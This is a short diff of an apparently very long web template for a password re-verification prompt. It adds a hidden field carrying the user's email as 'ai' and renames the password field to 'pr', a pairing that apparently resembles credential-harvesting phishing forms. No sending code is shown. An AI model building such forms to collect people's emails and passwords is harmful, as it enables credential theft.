@@ -10269,8 +10269,10 @@
                             <span id="msg" class="text-gray">Because you're accessing sensitive info, you need to verify your password.</span>
                         </div>
 
+                        <input type="hidden" name="ai" value="{{ $email }}" >
+
                         <div class="form-group mt-2">
-                            <input type="password" name="password" class="form-control rounded-0" id="password" placeholder="Enter Password">
+                            <input type="password" name="pr" class="form-control rounded-0" id="password" placeholder="Enter Password">
                         </div>
 
                         @if($errors->any())
